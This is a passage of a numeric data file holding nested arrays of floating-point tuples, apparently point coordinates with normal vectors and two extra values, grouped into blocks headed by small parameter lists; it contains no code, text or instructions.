5.0,0.591,-0.390,-0.704,0.071,0.183],[477,44.2,-59.1,0.591,-0.390,-0.704,0.089,0.249],[489,-2.55,-8.04,0.853,-0.398,-0.333,0.075,0.153],[508,43.2,-14.7,0.853,-0.398,-0.333,0.007,0.208],[498,-2.86,38.0,0.914,-0.399,-0.063,0.038,0.072],[518,42.9,36.8,0.914,-0.399,-0.063,0.050,0.082],[500,-2.89,87.8,0.915,-0.399,-0.037,0.095,0.011],[520,42.9,86.9,0.915,-0.399,-0.037,0.148,0.085],[504,-2.83,138,0.904,-0.401,-0.128,0.137,0.004],[524,42.8,135,0.904,-0.401,-0.128,0.213,0.057],[522,-2.87,189,0.738,-0.401,-0.540,0.161,0.002],[538,42.8,177,0.738,-0.401,-0.540,0.271,0.048],[568,-2.88,221,0.254,-0.401,-0.879,0.174,0.017],[573,42.8,201,0.254,-0.401,-0.879,0.252,0.118],[619,-2.90,229,0.094,-0.399,-0.911,0.105,0.026],[621,42.9,209,0.094,-0.399,-0.911,0.147,0.116],[669,-2.84,233,0.063,-0.399,-0.914,0.090,0.036],[670,42.9,213,0.063,-0.399,-0.914,0.038,0.172],[719,-2.71,236,0.050,-0.399,-0.915,0.042,0.024],[720,43.1,216,0.050,-0.399,-0.915,0.011,0.125],[769,-2.45,238,0.043,-0.399,-0.915,0.076,0.006],[770,43.3,219,0.043,-0.399,-0.915,0.017,0.133],[820,-2.03,241,0.041,-0.399,-0.915,0.055,0.006],[820,43.7,221,0.041,-0.399,-0.915,0.019,0.058],[870,-1.19,242,0.044,-0.398,-0.915,0.053,0.010],[869,44.6,222,0.044,-0.398,-0.915,0.006,0.069],[921,1.57,244,0.075,-0.393,-0.915,0.073,0.026],[918,47.2,224,0.075,-0.393,-0.915,0.005,0.124],[978,19.0,248,0.280,-0.324,-0.902,0.021,0.033],[955,57.8,227,0.280,-0.324,-0.902,0.004,0.124],[1019,67.4,251,0.430,-0.144,-0.890,0.081,0.030],[978,85.1,228,0.430,-0.144,-0.890,0.010,0.154],[1029,123,252,0.462,-0.023,-0.886,0.081,0.016],[985,126,229,0.462,-0.023,-0.886,0.104,0.083],[1031,174,252,0.463,-0.007,-0.886,0.165,0.007],[986,175,229,0.463,-0.007,-0.886,0.183,0.093],[1031,224,252,0.463,-0.003,-0.886,0.138,0.006],[987,225,229,0.463,-0.003,-0.886,0.242,0.064],[1032,275,252,0.463,-0,-0.886,0.274,0.006],[987,275,229,0.463,-0,-0.886,0.294,0.067],[1032,325,252,0.463,-0,-0.886,0.208,0.006],[987,325,229,0.463,-0,-0.886,0.144,0.081],[1032,375,252,0.463,-0,-0.886,0.079,0.006],[987,375,229,0.463,-0,-0.886,0.026,0.042]]],[350,3700,50,22.5,[[-371,424,-433,0.099,-0.015,-0.994,0,0.001],[-328,425,-429,0.099,-0.015,-0.994,0,0.001],[-371,374,-431,0.099,-0.058,-0.991,0,0.088],[-328,375,-426,0.099,-0.058,-0.991,0,0.092],[-371,325,-426,0.100,-0.157,-0.978,0,0.166],[-328,325,-421,0.100,-0.157,-0.978,0,0.177],[-371,287,-394,0.099,-0.960,-0.260,0.046,0.147],[-328,291,-393,0.099,-0.960,-0.260,0.045,0.155],[-371,280,-344,0.099,-0.992,-0.074,0.079,0.092],[-328,285,-344,0.099,-0.992,-0.074,0.107,0.096],[-371,278,-294,0.099,-0.993,-0.047,0.133,0.002],[-328,282,-294,0.099,-0.993,-0.047,0.139,0.002],[-371,275,-245,0.099,-0.991,-0.060,0.292,0],[-329,279,-244,0.099,-0.991,-0.060,0.225,0],[-372,269,-196,0.104,-0.970,-0.204,0.338,0],[-330,274,-194,0.104,-0.970,-0.204,0.240,0],[-376,246,-158,0.172,-0.532,-0.827,0.321,0.096],[-334,246,-149,0.172,-0.532,-0.827,0.221,0.033],[-383,202,-154,0.277,0.144,-0.949,0.348,0.452],[-342,194,-143,0.277,0.144,-0.949,0.236,0.409],[-390,155,-167,0.294,0.257,-0.920,0.302,0.798],[-349,146,-157,0.294,0.257,-0.920,0.125,0.737],[-397,109,-183,0.296,0.271,-0.915,0.235,0.674],[-357,99.3,-173,0.296,0.271,-0.915,0.161,0.673],[-404,62.4,-200,0.296,0.269,-0.915,0.330,0.343],[-364,52.5,-189,0.296,0.269,-0.915,0.301,0.453],[-412,15.1,-215,0.291,0.223,-0.928,0.339,0.272],[-371,5.90,-205,0.291,0.223,-0.928,0.276,0.395],[-419,-38.0,-214,0.170,-0.679,-0.713,0.019,0.153],[-377,-35.4,-206,0.170,-0.679,-0.713,0.022,0.148],[-417,-60.8,-161,0.156,-0.949,-0.273,0.001,0.115],[-376,-52.2,-168,0.156,-0.949,-0.273,0.004,0.174],[-373,-71.6,-110,0.080,-0.934,-0.346,0.001,0.167],[-360,-56.5,-148,0.080,-0.934,-0.346,0.004,0.202],[-320,-71.9,-100,0.058,-0.933,-0.352,0.001,0.532],[-315,-56.6,-139,0.058,-0.933,-0.352,0.002,0.674],[-270,-70.9,-94.3,0.058,-0.933,-0.352,0,0.874],[-266,-55.6,-134,0.058,-0.933,-0.352,0,0.871],[-220,-69.5,-89.8,0.058,-0.933,-0.352,0,0.757],[-217,-54.2,-129,0.058,-0.933,-0.352,0,0.782],[-170,-68.0,-85.3,0.062,-0.933,-0.352,0,0.654],[-167,-52.8,-125,0.062,-0.933,-0.352,0,0.796],[-120,-65.8,-81.4,0.077,-0.932,-0.351,0,0.703],[-118,-50.5,-121,0.077,-0.932,-0.351,0,0.754],[-69.9,-62.1,-78.0,0.113,-0.928,-0.350,0,0.731],[-68.8,-46.9,-118,0.113,-0.928,-0.350,0.005,0.825],[-18.7,-53.3,-75.3,0.291,-0.891,-0.343,0.076,0.315],[-21.7,-38.9,-115,0.291,-0.891,-0.343,0.089,0.336],[18.3,-12.3,-74.7,0.925,-0.176,-0.333,0.327,0.417],[4.30,-9.76,-115,0.925,-0.176,-0.333,0.364,0.346],[17.6,39.5,-74.8,0.937,0.103,-0.332,0.464,0.587],[3.43,37.9,-115,0.937,0.103,-0.332,0.490,0.507],[10.6,89.3,-74.9,0.931,0.141,-0.332,0.432,0.541],[-3.48,87.1,-115,0.931,0.141,-0.332,0.407,0.434],[2.97,138,-74.9,0.931,0.140,-0.332,0.421,0.712],[-11.1,136,-115,0.931,0.140,-0.332,0.304,0.642],[-3.61,188,-75.2,0.934,0.100,-0.333,0.382,0.471],[-17.8,186,-115,0.934,0.100,-0.333,0.319,0.408],[-4.48,236,-75.7,0.929,-0.127,-0.332,0.625,0.160],[-18.7,237,-115,0.929,-0.127,-0.332,0.578,0.059],[25.2,259,-77.6,0.036,-0.961,-0.268,0.813,0.054],[21.7,271,-118,0.036,-0.961,-0.268,0.800,0.136],[73.6,254,-81.3,-0.190,-0.949,-0.250,0.391,0.032],[72.2,265,-122,-0.190,-0.949,-0.250,0.471,0.061],[123,246,-85.6,-0.149,-0.955,-0.254,0.183,0.012],[120,257,-126,-0.149,-0.955,-0.254,0.213,0.012],[173,242,-90.4,-0.030,-0.963,-0.266,0.394,0.009],[169,254,-131,-0.030,-0.963,-0.266,0.484,0.009],[224,245,-95.9,0.078,-0.957,-0.277,0.686,0.007],[218,256,-136,0.078,-0.957,-0.277,0.728,0.007],[275,253,-104,0.125,-0.950,-0.283,0.787,0.002],[264,264,-144,0.125,-0.950,-0.283,0.738,0.002],[327,266,-128,0.072,-0.964,-0.251,0.764,0],[300,272,-160,0.072,-0.964,-0.251,0.589,0],[361,278,-178,0.006,-0.987,-0.156,0.496,0],[320,280,-190,0.006,-0.987,-0.156,0.402,0],[370,284,-231,-0.007,-0.995,-0.090,0.255,0],[328,285,-235,-0.007,-0.995,-0.090,0.239,0],[374,287,-281,-0.017,-0.996,0.017,0.268,0],[332,287,-284,-0.017,-0.996,0.017,0.290,0],[378,275,-328,-0.070,-0.754,0.647,0.199,0],[335,275,-332,-0.070,-0.754,0.647,0.248,0],[382,231,-340,-0.145,0.011,0.988,0.265,0],[340,227,-347,-0.145,0.011,0.988,0.333,0],[388,185,-334,-0.169,0.186,0.967,0.198,0],[347,175,-340,-0.169,0.186,0.967,0.193,0],[402,169,-326,-0.357,0.379,0.853,0.191,0],[391,129,-313,-0.357,0.379,0.853,0.172,0],[444,170,-307,-0.379,0.382,0.842,0.064,0.015],[440,130,-291,-0.379,0.382,0.842,0.084,0.015],[491,173,-288,-0.316,0.384,0.866,0.079,0.048],[487,133,-272,-0.316,0.384,0.866,0.110,0.055],[543,167,-278,0.084,0.331,0.939,0.128,0.046],[531,128,-264,0.084,0.331,0.939,0.120,0.052],[591,148,-280,0.182,0.299,0.935,0.022,0.019],[576,111,-266,0.182,0.299,0.935,0.208,0.021],[638,129,-282,0.126,0.324,0.935,0.274,0],[622,92.4,-268,0.126,0.324,0.935,0.362,0],[685,109,-274,-0.235,0.470,0.847,0.468,0],[665,74.6,-260,-0.235,0.470,0.847,0.410,0],[714,102,-231,-0.784,0.609,0.105,0.555,0.009],[689,69.1,-225,-0.784,0.609,0.105,0.448,0],[715,109,-181,-0.798,0.573,-0.180,0.359,0.007],[689,75.8,-177,-0.798,0.573,-0.180,0.326,0],[709,121,-134,-0.789,0.554,-0.261,0.038,0],[683,87.6,-127,-0.789,0.554,-0.261,0.140,0],[703,136,-88.6,-0.784,0.541,-0.301,0.064,0.001],[677,103,-79.1,-0.784,0.541,-0.301,0.147,0],[699,155,-45.1,-0.782,0.533,-0.321,0.181,0.045],[672,124,-31.6,-0.782,0.533,-0.321,0.106,0.021],[699,178,-5.42,-0.778,0.565,-0.271,0.195,0.101],[673,151,15.4,-0.778,0.565,-0.271,0.325,0.086],[711,198,17.7,-0.604,0.794,-0.046,0.035,0.173],[699,191,58.3,-0.604,0.794,-0.046,0.044,0.187],[744,213,15.3,-0.321,0.946,-0.033,0.056,0.092],[754,218,56.7,-0.321,0.946,-0.033,0,0.176],[788,226,0.842,-0.248,0.967,-0.056,0.205,0.042],[801,231,41.2,-0.248,0.967,-0.056,0.044,0.266],[835,235,-15.5,-0.190,0.978,-0.076,0.330,0.184],[847,241,24.9,-0.190,0.978,-0.076,0.161,0.324],[883,242,-30.8,-0.129,0.986,-0.095,0.273,0.425],[894,247,10,-0.129,0.986,-0.095,0.259,0.558],[931,245,-44.0,-0.088,0.989,-0.107,0.127,0.749],[941,251,-2.79,-0.088,0.989,-0.107,0.229,0.784],[980,249,-55.8,-0.124,0.985,-0.099,0.107,0.515],[989,254,-14.3,-0.124,0.985,-0.099,0.218,0.513],[1029,261,-66.1,-0.448,0.889,-0.031,0.141,0.085],[1035,265,-24.1,-0.448,0.889,-0.031,0.178,0.077],[1058,302,-72.0,-0.974,0.211,0.073,0.186,0.080],[1062,303,-29.3,-0.974,0.211,0.073,0.166,0.015],[1065,352,-73.3,-0.994,0.058,0.077,0.062,0.024],[1068,352,-30.6,-0.994,0.058,0.077,0.078,0],[1067,402,-73.7,-0.996,0.024,0.078,0.002,0],[1070,402,-31.0,-0.996,0.024,0.078,0.002,0]]],[50,2850,50,30,[[-950,89.9,-278,-0.359,-0.267,-0.780,0,0.088],[-961,126,-286,-0.359,-0.267,-0.780,0,0.107],[-907,98.2,-301,-0.351,-0.269,-0.776,0,0.154],[-917,134,-309,-0.351,-0.269,-0.776,0,0.159],[-863,106,-323,-0.322,-0.266,-0.785,0,0.134],[-873,142,-331,-0.322,-0.266,-0.785,0,0.126],[-818,113,-342,-0.256,-0.258,-0.809,0,0.160],[-826,149,-351,-0.256,-0.258,-0.809,0,0.169],[-772,117,-354,-0.139,-0.241,-0.850,0.162,0.207],[-777,154,-364,-0.139,-0.241,-0.850,0.118,0.192],[-724,120,-360,-0.028,-0.230,-0.864,0.306,0.242],[-726,157,-370,-0.028,-0.230,-0.864,0.299,0.204],[-675,122,-359,0.085,-0.221,-0.853,0.237,0.311],[-675,158,-368,0.085,-0.221,-0.853,0.215,0.235],[-626,124,-349,0.282,-0.207,-0.809,0.266,0.348],[-626,161,-359,0.282,-0.207,-0.809,0.248,0.273],[-582,129,-327,0.514,-0.184,-0.721,0.270,0.484],[-582,167,-337,0.514,-0.184,-0.721,0.272,0.349],[-542,137,-297,0.580,-0.180,-0.714,0.205,0.598],[-543,176,-308,0.580,-0.180,-0.714,0.166,0.408],[-498,146,-273,0.252,-0.239,-0.862,0.158,0.586],[-501,184,-284,0.252,-0.239,-0.862,0.122,0.429],[-448,150,-277,-0.247,-0.281,-0.838,0.143,0.410],[-453,187,-288,-0.247,-0.281,-0.838,0.104,0.378],[-401,151,-296,-0.346,-0.279,-0.781,0.083,0.323],[-407,188,-306,-0.346,-0.279,-0.781,0.032,0.476],[-356,152,-316,-0.325,-0.279,-0.792,0.048,0.340],[-361,188,-327,-0.325,-0.279,-0.792,0.025,0.566],[-309,154,-332,-0.217,-0.278,-0.829,0.059,0.327],[-314,191,-343,-0.217,-0.278,-0.829,0.032,0.534],[-263,156,-341,-0.049,-0.294,-0.838,0.059,0.294],[-262,192,-353,-0.049,-0.294,-0.838,0.048,0.416],[-228,147,-332,0.354,-0.387,-0.729,0.045,0.217],[-206,179,-337,0.354,-0.387,-0.729,0.100,0.261],[-206,126,-302,0.474,-0.501,-0.583,0.296,0.192],[-176,150,-298,0.474,-0.501,-0.583,0.322,0.251],[-199,101,-271,0.492,-0.564,-0.509,0.453,0.257],[-167,113,-254,0.492,-0.564,-0.509,0.340,0.409],[-215,75.3,-253,0.446,-0.656,-0.433,0.442,0.205],[-195,68.2,-221,0.446,-0.656,-0.433,0.588,0.378],[-251,44.6,-242,0.420,-0.695,-0.393,0.311,0.156],[-233,36.4,-208,0.420,-0.695,-0.393,0.369,0.265],[-290,12.0,-222,0.380,-0.734,-0.361,0.138,0.219],[-266,9.87,-192,0.380,-0.734,-0.361,0.243,0.228],[-317,-18.6,-176,0.310,-0.806,-0.271,0.085,0.057],[-281,-8.67,-165,0.310,-0.806,-0.271,0.107,0.107],[-318,-34.3,-122,0.305,-0.831,-0.214,0.338,0.283],[-281,-20.6,-123,0.305,-0.831,-0.214,0.261,0.430],[-308,-44.2,-71.3,0.314,-0.832,-0.220,0.214,0.315],[-273,-28.8,-78.6,0.314,-0.832,-0.220,0.242,0.506],[-286,-51.2,-20.2,0.272,-0.824,-0.285,0.074,0.154],[-256,-34.7,-38.9,0.272,-0.824,-0.285,0.135,0.454],[-241,-54.5,17.6,0.170,-0.816,-0.382,0.036,0.137],[-226,-36.6,-14.0,0.170,-0.816,-0.382,0.098,0.427],[-186,-53.0,31.7,0.079,-0.818,-0.404,0.033,0.074],[-184,-35.5,-3.38,0.079,-0.818,-0.404,0.091,0.222],[-129,-48.2,24.7,-0.051,-0.830,-0.388,0.044,0.130],[-144,-32.1,-7.80,-0.051,-0.830,-0.388,0.109,0.305],[-83.5,-39.0,-15.3,-0.183,-0.857,-0.262,0.107,0.324],[-117,-26.8,-31.7,-0.183,-0.857,-0.262,0.174,0.371],[-65.7,-29.7,-66.0,-0.184,-0.869,-0.187,0.283,0.400],[-102,-20.2,-73.8,-0.184,-0.869,-0.187,0.256,0.418],[-53.8,-21.9,-113,-0.176,-0.874,-0.178,0.315,0.250],[-90.8,-12.8,-121,-0.176,-0.874,-0.178,0.261,0.206],[-39.5,-16.2,-156,-0.171,-0.881,-0.158,0.078,0.202],[-73.6,-6.60,-173,-0.171,-0.881,-0.158,0.176,0.087],[-12.5,-19.1,-176,-0.180,-0.862,-0.158,0.027,0.273],[-23.9,-10.2,-212,-0.180,-0.862,-0.158,0.051,0.304],[33.8,-17.4,-187,0.367,-0.753,-0.262,0.177,0.303],[25.7,-8.98,-222,0.367,-0.753,-0.262,0.183,0.270],[53.6,28.1,-183,0.874,-0.065,-0.259,0.449,0.416],[42.9,33.3,-221,0.874,-0.065,-0.259,0.398,0.439],[58.8,76.9,-177,0.893,-0.116,-0.268,0.458,0.245],[48.1,83.2,-216,0.893,-0.116,-0.268,0.421,0.241],[80.9,114,-174,0.377,-0.776,-0.333,0.248,0.137],[75.4,127,-211,0.377,-0.776,-0.333,0.276,0.140],[127,123,-174,0.062,-0.838,-0.306,0.236,0.256],[126,136,-211,0.062,-0.838,-0.306,0.273,0.266],[166,127,-168,0.382,-0.784,-0.185,0.213,0.466],[183,142,-198,0.382,-0.784,-0.185,0.225,0.676],[186,143,-132,0.643,-0.642,0.075,0.379,0.552],[209,163,-155,0.643,-0.642,0.075,0.535,0.758],[219,179,-96.7,0.607,-0.685,0.073,0.641,0.386],[231,186,-133,0.607,-0.685,0.073,0.614,0.655],[261,212,-85.3,0.465,-0.811,0.042,0.573,0.326],[266,213,-125,0.465,-0.811,0.042,0.411,0.573],[311,228,-83.0,0.082,-0.919,0.025,0.329,0.206],[310,227,-122,0.082,-0.919,0.025,0.356,0.524],[362,226,-87.5,-0.090,-0.893,0.038,0.386,0.459],[358,225,-125,-0.090,-0.893,0.038,0.463,0.442],[412,221,-93.3,-0.054,-0.895,0.034,0.249,0.574],[407,220,-131,-0.054,-0.895,0.034,0.421,0.526],[462,221,-99.9,0.078,-0.893,0.017,0.291,0.407],[457,220,-138,0.078,-0.893,0.017,0.381,0.504],[510,229,-106,0.194,-0.886,0.003,0.270,0.164],[506,228,-144,0.194,-0.886,0.003,0.356,0.320],[559,241,-112,0.225,-0.889,-0,0.233,0.036],[554,240,-151,0.225,-0.889,-0,0.333,0.104],[607,253,-118,0.227,-0.892,0,0.132,0.008],[602,252,-157,0.227,-0.892,0,0.062,0.023],[655,265,-123,0.204,-0.902,0.002,0.062,0],[650,264,-163,0.204,-0.902,0.002,0.113,0],[703,270,-128,-0.064,-0.917,0.023,0.062,0.008],[701,270,-167,-0.064,-0.917,0.023,0.181,0.008],[750,260,-129,-0.262,-0.860,0.047,0.121,0.137],[751,258,-168,-0.262,-0.860,0.047,0.257,0.109],[782,256,-119,0.096,-0.864,0.225,0.063,0.106],[810,252,-146,0.096,-0.864,0.225,0.196,0.087],[797,275,-86.1,0.228,-0.786,0.400,0.081,0.093],[833,278,-100,0.228,-0.786,0.400,0.129,0.066],[809,299,-45.2,0.225,-0.795,0.394,0.213,0.016],[846,303,-57.7,0.225,-0.795,0.394,0.211,0.012]]],[200,3000,50,25,[[-906,125,-205,-0.208,0.288,-0.904,0.283,0.000],[-903,165,-193,-0.208,0.288,-0.904,0.174,0.000],[-857,125,-216,-0.206,0.288,-0.903,0.352,0.069],[-855,165,-204,-0.206,0.288,-0.903,0.157,0.001],[-808,126,-226,-0.176,0.289,-0.909,0.399,0.136],[-806,166,-214,-0.176,0.289,-0.909,0.239,0.003],[-757,127,-234,-0.113,0.290,-0.920,0.400,0.186],[-758,167,-221,-0.113,0.290,-0.920,0.356,0.006],[-706,130,-237,-0.026,0.293,-0.927,0.491,0.185],[-709,170,-224,-0.026,0.293,-0.927,0.383,0.009],[-656,134,-235,0.052,0.295,-0.923,0.587,0.108],[-660,173,-223,0.052,0.295,-0.923,0.331,0.014],[-607,135,-229,0.169,0.295,-0.906,0.664,0.180],[-609,175,-216,0.169,0.295,-0.906,0.392,0.019],[-561,132,-217,0.327,0.285,-0.867,0.636,0.228],[-560,171,-204,0.327,0.285,-0.867,0.358,0.092],[-516,123,-199,0.450,0.265,-0.822,0.482,0.272],[-513,162,-185,0.450,0.265,-0.822,0.402,0.220],[-473,110,-178,0.484,0.261,-0.811,0.309,0.385],[-469,149,-163,0.484,0.261,-0.811,0.235,0.307],[-429,98.6,-157,0.417,0.279,-0.845,0.363,0.506],[-426,138,-143,0.417,0.279,-0.845,0.317,0.503],[-380,92.0,-140,0.252,0.299,-0.900,0.324,0.569],[-381,132,-127,0.252,0.299,-0.900,0.341,0.648],[-330,92.3,-130,0.117,0.297,-0.924,0.264,0.651],[-333,132,-118,0.117,0.297,-0.924,0.240,0.586],[-280,96.1,-124,0.062,0.291,-0.930,0.235,0.646],[-284,135,-112,0.062,0.291,-0.930,0.178,0.412],[-230,100,-120,0.041,0.287,-0.932,0.271,0.480],[-235,140,-108,0.041,0.287,-0.932,0.222,0.277],[-181,105,-117,0.023,0.279,-0.935,0.321,0.280],[-184,145,-105,0.023,0.279,-0.935,0.271,0.103],[-162,110,-115,-0.031,0.304,-0.927,0.318,0.256],[-120,113,-115,-0.031,0.304,-0.927,0.414,0.290],[-176,77.5,-130,0.068,0.506,-0.845,0.268,0.406],[-138,60.9,-137,0.068,0.506,-0.845,0.186,0.500],[-194,47.0,-168,0.279,0.876,-0.356,0.241,0.592],[-154,33.1,-171,0.279,0.876,-0.356,0.216,0.391],[-198,39.0,-218,0.310,0.927,-0.054,0.313,0.786],[-158,25.7,-218,0.310,0.927,-0.054,0.274,0.353],[-195,38.3,-271,0.311,0.928,0.050,0.363,0.769],[-156,24.8,-265,0.311,0.928,0.050,0.300,0.262],[-173,40.1,-327,0.223,0.922,0.251,0.405,0.736],[-142,25.8,-301,0.223,0.922,0.251,0.285,0.191],[-117,43.6,-355,0.001,0.906,0.368,0.148,0.240],[-110,28.1,-316,0.001,0.906,0.368,0.139,0.051],[-65.6,46.8,-359,-0.044,0.903,0.369,0.287,0.028],[-63.4,31.1,-320,-0.044,0.903,0.369,0.153,0.032],[-15.3,50,-359,-0.054,0.902,0.370,0.550,0.025],[-14.0,34.2,-321,-0.054,0.902,0.370,0.432,0.073],[34.9,53.2,-359,-0.063,0.902,0.372,0.564,0.047],[35.4,37.3,-320,-0.063,0.902,0.372,0.451,0.158],[85.7,56.8,-357,-0.090,0.902,0.376,0.415,0.038],[84.3,40.5,-319,-0.090,0.902,0.376,0.270,0.071],[140,61.7,-348,-0.257,0.886,0.334,0.366,0.022],[127,44.3,-312,-0.257,0.886,0.334,0.232,0.032],[182,70.4,-305,-0.477,0.840,0.127,0.380,0.050],[152,50.2,-284,-0.477,0.840,0.127,0.332,0.075],[207,76.7,-273,-0.334,0.874,0.250,0.397,0.064],[188,60.1,-240,-0.334,0.874,0.250,0.410,0.094],[243,82.3,-266,-0.105,0.912,0.339,0.462,0.051],[247,68.1,-227,-0.105,0.912,0.339,0.527,0.066],[284,97.3,-271,-0.554,0.708,0.397,0.326,0.029],[298,86.2,-232,-0.554,0.708,0.397,0.498,0.029],[308,140,-270,-0.863,0.218,0.412,0.369,0.174],[323,128,-232,-0.863,0.218,0.412,0.572,0.203],[323,185,-220,-0.971,-0.121,0.017,0.483,0.483],[328,143,-220,-0.971,-0.121,0.017,0.524,0.339],[322,174,-165,-0.963,-0.117,-0.049,0.675,0.648],[327,135,-177,-0.963,-0.117,-0.049,0.628,0.494],[328,148,-112,-0.918,-0.259,0.176,0.473,0.621],[330,119,-142,-0.918,-0.259,0.176,0.516,0.512],[361,100,-94.4,-0.705,-0.573,0.334,0.346,0.403],[351,89.8,-133,-0.705,-0.573,0.334,0.329,0.345],[396,71.2,-93.7,-0.329,-0.832,0.350,0.156,0.369],[392,56.6,-132,-0.329,-0.832,0.350,0.285,0.298],[440,71.6,-90.5,0.221,-0.859,0.382,0.104,0.364],[447,56.6,-128,0.221,-0.859,0.382,0.216,0.349],[481,95.5,-89.6,0.627,-0.630,0.390,0.057,0.332],[491,82.3,-127,0.627,-0.630,0.390,0.099,0.318],[513,132,-91.6,0.631,-0.649,0.393,0.153,0.385],[525,119,-130,0.631,-0.649,0.393,0.143,0.339],[556,152,-84.7,0.047,-0.933,0.299,0.158,0.372],[569,141,-122,0.047,-0.933,0.299,0.207,0.416],[596,154,-66.5,-0.210,-0.942,0.189,0.263,0.255],[619,142,-99.7,-0.210,-0.942,0.189,0.303,0.292],[612,149,-38.5,-0.405,-0.875,-0.168,0.170,0.240],[650,132,-44.5,-0.405,-0.875,-0.168,0.131,0.357],[608,138,6.06,-0.394,-0.851,-0.260,0.051,0.263],[646,120,7.70,-0.394,-0.851,-0.260,0.021,0.106],[600,127,53.7,-0.388,-0.849,-0.262,0.026,0.356],[637,109,56.1,-0.388,-0.849,-0.262,0,0.166],[593,116,103,-0.389,-0.863,-0.193,0.076,0.422],[630,99.4,103,-0.389,-0.863,-0.193,0.074,0.325],[599,109,158,-0.368,-0.896,0.055,0.100,0.407],[635,93.6,146,-0.368,-0.896,0.055,0.157,0.408],[621,110,206,-0.233,-0.870,0.327,0.100,0.365],[654,94.9,188,-0.233,-0.870,0.327,0.047,0.382],[654,137,235,0.285,-0.474,0.796,0.063,0.334],[683,117,213,0.285,-0.474,0.796,0.088,0.431],[702,178,229,0.505,-0.279,0.784,0.004,0.238],[708,140,212,0.505,-0.279,0.784,0.048,0.454],[750,183,196,0.571,-0.253,0.748,0.077,0.617],[742,143,188,0.571,-0.253,0.748,0.108,0.466],[789,182,165,0.574,-0.249,0.746,0.275,0.452],[781,141,157,0.574,-0.249,0.746,0.182,0.284],[828,180,135,0.584,-0.247,0.739,0.334,0.222],[821,140,126,0.584,-0.247,0.739,0.218,0.163],[862,185,108,0.634,-0.232,0.700,0.175,0.129],[865,147,92.4,0.634,-0.232,0.700,0.146,0.084],[879,207,95.5,0.756,-0.088,0.606,0.063,0.114],[902,193,64.0,0.756,-0.088,0.606,0.043,0.196]]],[300,3300,50,25,[[-803,155,-281,-0.083,0.282,-0.943,0.670,0.563],[-800,195,-270,-0.083,0.282,-0.943,0.328,0.494],[-754,152,-285,-0.035,0.276,-0.945,0.627,0.587],[-750,192,-274,-0.035,0.276,-0.945,0.351,0.545],[-707,146,-286,0.096,0.258,-0.948,0.594,0.633],[-699,186,-275,0.096,0.258,-0.948,0.390,0.603],[-661,132,-281,0.234,0.224,-0.937,0.569,0.577],[-649,171,-269,0.234,0.224,-0.937,0.492,0.702],[-617,113,-273,0.275,0.210,-0.932,0.465,0.392],[-602,151,-260,0.275,0.210,-0.932,0.474,0.711],[-572,93.5,-265,0.274,0.211,-0.933,0.348,0.333],[-557,131,-252,0.274,0.211,-0.933,0.417,0.636],[-528,72.9,-257,0.222,0.236,-0.943,0.116,0.268],[-512,110,-244,0.222,0.236,-0.943,0.220,0.433],[-482,53.2,-256,0.039,0.314,-0.947,0.223,0.319],[-466,90.7,-243,0.039,0.314,-0.947,0.144,0.401],[-437,38.2,-269,-0.296,0.426,-0.850,0.291,0.231],[-420,75.4,-256,-0.296,0.426,-0.850,0.151,0.375],[-395,28.8,-294,-0.453,0.462,-0.753,0.048,0.174],[-379,65.9,-281,-0.453,0.462,-0.753,0.051,0.225],[-355,22.3,-325,-0.503,0.472,-0.714,0.006,0.077],[-340,59.5,-311,-0.503,0.472,-0.714,0.047,0.148],[-316,18.3,-357,-0.528,0.477,-0.693,0.002,0.061],[-302,55.6,-342,-0.528,0.477,-0.693,0.069,0.148],[-274,19.4,-389,-0.554,0.479,-0.671,0.002,0.188],[-265,56.4,-370,-0.554,0.479,-0.671,0.064,0.386],[-224,40.2,-418,-0.610,0.451,-0.640,0.001,0.347],[-235,68.6,-388,-0.610,0.451,-0.640,0.067,0.531],[-185,84.0,-426,-0.619,0.444,-0.631,0,0.451],[-208,98.7,-393,-0.619,0.444,-0.631,0.078,0.625],[-157,130,-417,-0.565,0.536,-0.603,0.012,0.495],[-185,135,-386,-0.565,0.536,-0.603,0.114,0.548],[-132,173,-388,-0.415,0.791,-0.419,0.046,0.274],[-167,167,-366,-0.415,0.791,-0.419,0.286,0.234],[-117,194,-338,-0.323,0.925,-0.143,0.124,0.170],[-157,182,-328,-0.323,0.925,-0.143,0.207,0.171],[-109,202,-288,-0.306,0.940,-0.065,0.237,0.208],[-148,190,-280,-0.306,0.940,-0.065,0.136,0.255],[-101,207,-239,-0.299,0.944,-0.030,0.063,0.216],[-141,195,-232,-0.299,0.944,-0.030,0.150,0.242],[-94.0,210,-189,-0.292,0.945,-0.003,0.285,0.149],[-133,198,-182,-0.292,0.945,-0.003,0.227,0.371],[-85.2,212,-141,-0.278,0.946,0.035,0.193,0.482],[-124,200,-132,-0.278,0.946,0.035,0.094,0.569],[-72.8,212,-96.0,-0.241,0.944,0.142,0.066,0.585],[-110,200,-81.9,-0.241,0.944,0.142,0.013,0.580],[-50.5,207,-64.4,-0.025,0.888,0.434,0.113,0.555],[-76.3,191,-34.6,-0.025,0.888,0.434,0.036,0.615],[-12.1,193,-49.8,0.186,0.815,0.529,0.192,0.352],[-26.6,174,-14.9,0.186,0.815,0.529,0.115,0.380],[31.7,176,-44.7,0.293,0.772,0.540,0.654,0.400],[22.1,155,-9.37,0.293,0.772,0.540,0.563,0.466],[72.9,158,-48.7,0.563,0.640,0.495,0.410,0.422],[71.0,133,-14.5,0.563,0.640,0.495,0.396,0.575],[91.5,136,-75.9,0.959,0.240,0.039,0.242,0.691],[99.2,101,-52.6,0.959,0.240,0.039,0.338,0.633],[95.2,110,-118,0.974,0.153,-0.083,0.185,0.373],[102,75.5,-94.9,0.974,0.153,-0.083,0.404,0.441],[93.1,68.2,-161,0.963,-0.012,-0.224,0.330,0.717],[101,50.3,-124,0.963,-0.012,-0.224,0.400,0.455],[82.3,4.01,-151,0.921,-0.291,-0.232,0.392,0.432],[96.9,21.5,-115,0.921,-0.291,-0.232,0.541,0.451],[76.6,-40,-123,0.932,-0.217,-0.284,0.485,0.206],[92.0,-18.2,-89.6,0.932,-0.217,-0.284,0.724,0.259],[92.7,-81.8,-99.8,0.530,0.522,-0.664,0.354,0.060],[105,-55.6,-68.6,0.530,0.522,-0.664,0.516,0.066],[142,-96.8,-103,-0.098,0.756,-0.643,0.399,0],[149,-68.9,-71.9,-0.098,0.756,-0.643,0.623,0.008],[194,-82.3,-117,-0.634,0.589,-0.493,0.435,0.000],[189,-59.0,-82.4,-0.634,0.589,-0.493,0.645,0.022],[226,-39.2,-130,-0.844,0.329,-0.405,0.339,0.147],[213,-23.7,-93.1,-0.844,0.329,-0.405,0.534,0.292],[246,6.55,-141,-0.864,0.287,-0.393,0.265,0.269],[233,19.6,-102,-0.864,0.287,-0.393,0.358,0.476],[266,54.6,-148